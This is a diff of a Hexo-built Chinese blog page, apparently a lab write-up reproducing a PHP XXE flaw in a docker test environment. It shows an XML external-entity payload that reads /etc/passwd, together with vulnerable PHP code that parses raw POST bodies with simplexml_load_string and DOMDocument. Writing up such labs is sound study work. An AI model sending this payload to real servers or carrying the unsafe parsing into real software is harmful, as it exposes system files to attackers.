@@ -4,19 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hexo">
-    <meta name="description" content="
-
-
-
-php-xxe
-
-漏洞复现：
-进入靶场
-docker compose up -d
+    <meta name="keywords" content="php-xxe, Hexo">
+    <meta name="description" content="漏洞复现：进入靶场
+1docker compose up -d
 
 访问8080端口即可看到phpinfo界面，搜索libxml即可看到版本号为2.8.0，存在外部实体加载漏洞，访问漏洞存在的页面添加payload
-">
+1234567&amp;lt;?x">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -28,7 +21,7 @@ docker compose up -d
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hexo</title>
+    <title>php-xxe | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -350,7 +343,7 @@ docker compose up -d
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">php-xxe</h1>
                 </div>
             </div>
         </div>
@@ -378,6 +371,23 @@ docker compose up -d
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
+                            </a>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                Php
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -407,49 +417,24 @@ docker compose up -d
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <!doctype html>
-<html>
-<head>
-<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
-<title>php-xxe</title>
-</head>
-<body><h2 id='漏洞复现'>漏洞复现：</h2>
-<p>进入靶场</p>
-<pre><code>docker compose up -d
-</code></pre>
-<p>访问8080端口即可看到phpinfo界面，搜索libxml即可看到版本号为2.8.0，存在外部实体加载漏洞，访问漏洞存在的页面添加payload</p>
-<pre><code class='language-xml' lang='xml'>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;
-</code></pre>
-<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\php-xxe.png" referrerpolicy="no-referrer" alt="php-xxe"></p>
-<p>也可以使用http进行内网主机探测，这里不再过多介绍</p>
-<h2 id='漏洞分析'>漏洞分析：</h2>
-<p>由于libxml2.8.0版本能然允许外部实体的加载，因此我们可以通过xmlpayload进行操作，看一下网站的源码，其中一个文件</p>
-<pre><code class='language-php' lang='php'>&lt;?php
-$data = file_get_contents(&#39;php://input&#39;);
-$xml = simplexml_load_string($data);
+                <h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>进入靶场</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
 
-echo $xml-&gt;name;
-</code></pre>
+<p>访问8080端口即可看到phpinfo界面，搜索libxml即可看到版本号为2.8.0，存在外部实体加载漏洞，访问漏洞存在的页面添加payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\Php\php-xxe.png" alt="php-xxe"></p>
+<p>也可以使用http进行内网主机探测，这里不再过多介绍</p>
+<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p>由于libxml2.8.0版本能然允许外部实体的加载，因此我们可以通过xmlpayload进行操作，看一下网站的源码，其中一个文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br></pre></td></tr></table></figure>
+
 <p>直接解析了post的内容，并且回显在name位，因此只需要在<name></name>处调用读取文件的外部实体即可</p>
 <p>dom.php则更简单，不需要指定的名称即可调用</p>
-<pre><code class='language-php' lang='php'>&lt;?php
-$data = file_get_contents(&#39;php://input&#39;);
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$dom</span>);</span><br></pre></td></tr></table></figure>
 
-$dom = new DOMDocument();
-$dom-&gt;loadXML($data);
-
-print_r($dom);
-</code></pre>
 <p><strong>利用条件</strong></p>
 <p>libxml版本低于2.9.0允许外部实体的加载，该漏洞与php版本无关</p>
-</body>
-</html>
+
                 
             </div>
             <hr/>
@@ -593,13 +578,13 @@ print_r($dom);
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-xxe/">
+                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-wen-jian-bao-han-lou-dong-li-yong-phpinfo/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="PHP文件包含漏洞（利用phpinfo）">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">PHP文件包含漏洞（利用phpinfo）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -614,8 +599,20 @@ print_r($dom);
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            uu2fu3o
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Php/" class="post-category">
+                                    Php
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -630,13 +627,13 @@ print_r($dom);
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/php/php-xdebug-dai-ma-zhi-xing/">
+                <a href="/2023/09/03/shen-tou-ce-shi/lou-dong-fu-xian/tomcat/cve-2017-12615/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="CVE-2017-12615">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">CVE-2017-12615</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -651,8 +648,20 @@ print_r($dom);
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            uu2fu3o
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat/" class="post-category">
+                                    Tomcat
+                                </a>
+                            
                             
                         </span>
                     </div>
